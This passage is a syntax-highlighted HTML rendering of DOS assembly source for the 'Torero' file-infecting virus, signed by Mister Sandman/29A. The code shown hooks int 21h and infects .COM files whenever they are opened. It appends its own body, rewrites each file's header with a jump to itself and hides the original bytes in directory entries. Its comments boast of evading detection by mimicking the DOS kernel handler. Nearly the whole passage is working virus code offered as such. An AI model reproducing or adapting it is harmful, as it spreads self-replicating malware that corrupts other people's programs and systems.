                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">header_store</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Ok, let's copy</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; the original file</span><span class="sc0">
                                                        </span><span class="sc1">; header to the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">header_store</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; directory entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">more_files</span><span class="sc0">

</span><span class="sc1">; ФФД Torero's signature УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">signature</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'[Torero :-) by Mister Sandman/29A]'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

</span><span class="sc1">; ФФД Torero's int 21h handler УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">new_int_21h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">                      </span><span class="sc1">; This code is stolen</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">real_checks</span><span class="sc0">                 </span><span class="sc1">; from the original</span><span class="sc0">
                                                    </span><span class="sc1">; DOS kernel handler,</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0">                      </span><span class="sc1">; so they won't catch</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">real_checks</span><span class="sc0">                 </span><span class="sc1">; us if they don't go</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fake_stuff</span><span class="sc0">                  </span><span class="sc1">; further thru the</span><span class="sc0">
                                                    </span><span class="sc1">; rest of the code of</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">                      </span><span class="sc1">; the handler... thanx</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">fake_stuff</span><span class="sc0">                  </span><span class="sc1">; to Qark for this</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">real_checks</span><span class="sc0">                 </span><span class="sc1">; cool idea :)</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">real_checks</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fake_stuff</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">real_checks</span><span class="sc0">

</span><span class="sc5">fake_stuff</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">; Shit, shit, shit,</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">                                 </span><span class="sc1">; shit... skip it</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">real_checks</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">opening</span><span class="sc0">                     </span><span class="sc1">; (get DOS version)?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">';)'</span><span class="sc0">                     </span><span class="sc1">; Return the smiley :)</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">opening</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                      </span><span class="sc1">; File opening?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_open</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">; Attribute change?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">new_attribute</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6c00h</span><span class="sc0">                    </span><span class="sc1">; Extended open?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_open</span><span class="sc0">

</span><span class="sc5">jmp_int_21h</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                        </span><span class="sc1">; Jump to the original</span><span class="sc0">
</span><span class="sc5">old_int_21h</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                         </span><span class="sc1">; int 21h address</span><span class="sc0">

</span><span class="sc1">; ФФД File open УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">file_open</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">                 </span><span class="sc1">; Infection routine</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int_21h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Jump back to int 21h</span><span class="sc0">

</span><span class="sc1">; ФФД New attribute УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">new_attribute</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                      </span><span class="sc1">; Change 43h for 30h</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">                                </span><span class="sc1">; so it will do nothing</span><span class="sc0">

</span><span class="sc1">; ФФД Infection routine УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; Push registers, flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                 </span><span class="sc1">; and all that shit</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_24h</span><span class="sc0">                 </span><span class="sc1">; Set int 24h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">                      </span><span class="sc1">; Extended open?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">normal_open</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; Fix it to DS:DX</span><span class="sc0">
</span><span class="sc5">normal_open</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">                    </span><span class="sc1">; Open the file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; File handle in BX</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">; CS=DS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">                     </span><span class="sc1">; Get file's SFT</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_mark</span><span class="sc0">                  </span><span class="sc1">; Already infected?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">close_and_pop</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; Open mode=r/w</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Check the extension</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">                     </span><span class="sc1">; of our victim</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close_and_pop</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">infecting</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; Read the first three</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; bytes to our temporal</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">header_store</span><span class="sc0">             </span><span class="sc1">; header store</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; File lenght in AX</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ea60h</span><span class="sc0">                   </span><span class="sc1">; Too big file?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">close_and_pop</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Lseek to the end of</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_end</span><span class="sc0">                   </span><span class="sc1">; the file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Append our k-r4d</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">torero_size</span><span class="sc0">              </span><span class="sc1">; code :)</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">torero_start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                             </span><span class="sc1">; Make the jmp to</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">; our virus body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">com_header</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; for the new file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_marker</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_start</span><span class="sc0">                 </span><span class="sc1">; Lseek to the start</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Write the new header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; in so we'll be always</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">com_header</span><span class="sc0">               </span><span class="sc1">; executed first ;P</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Actual size in AX</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; Lseek to the position</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_end</span><span class="sc0">                   </span><span class="sc1">; of the original header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Destroy all the info,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; already stored in the</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">garbage</span><span class="sc0">                  </span><span class="sc1">; directory entry };)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">

</span><span class="sc5">close_and_pop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; Close the file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21h</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">reset_int_24h</span><span class="sc0">               </span><span class="sc1">; Reset int 24h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                 </span><span class="sc1">; And pop out all the</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; shit we pushed b4</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ФФД Call to the original int 13h УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">int_13h</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int_13h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Call the original</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                 </span><span class="sc1">; int 13h</span><span class="sc0">

</span><span class="sc1">; ФФД Call to the original int 21h УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">int_21h</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int_21h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Call the original</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                 </span><span class="sc1">; int 21h</span><span class="sc0">

</span><span class="sc1">; ФФД Get SFT in ES:DI УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">get_sft</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">                   </span><span class="sc1">; Get job file table</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">                        </span><span class="sc1">; in ES:DI (DOS 3+)</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">bad_sft</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; Get the address of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">                   </span><span class="sc1">; the specific SFT for</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; our handle</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">

</span><span class="sc5">bad_sft</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Pop registers and</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">; return to the code</span><span class="sc0">

</span><span class="sc1">; ФФД Check our infection mark УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">check_mark</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">     </span><span class="sc1">; Compare with the min.</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">; value of our mark</span><span class="sc0">

</span><span class="sc1">; ФФД Read the directory entry УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">read_entry</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">parameters</span><span class="sc0">                 </span><span class="sc1">; Load the sector</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">25h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ФФД Sector loading УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">parameters</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1bh</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Load the sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">control_block</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; number in our</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; control block</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">control_block</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Read a long</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">                         </span><span class="sc1">; sector, 4 bytes</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                </span><span class="sc1">; CS=DS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">control_block</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; One sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">control_block</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">control_block</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">control_block</span><span class="sc0">                  </span><span class="sc1">; Control block</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Point to the</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">                                     </span><span class="sc1">; DPB</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ФФД Point to the original header УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">point_entry</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Guess the entry</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                       </span><span class="sc1">; Multiply it*20h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
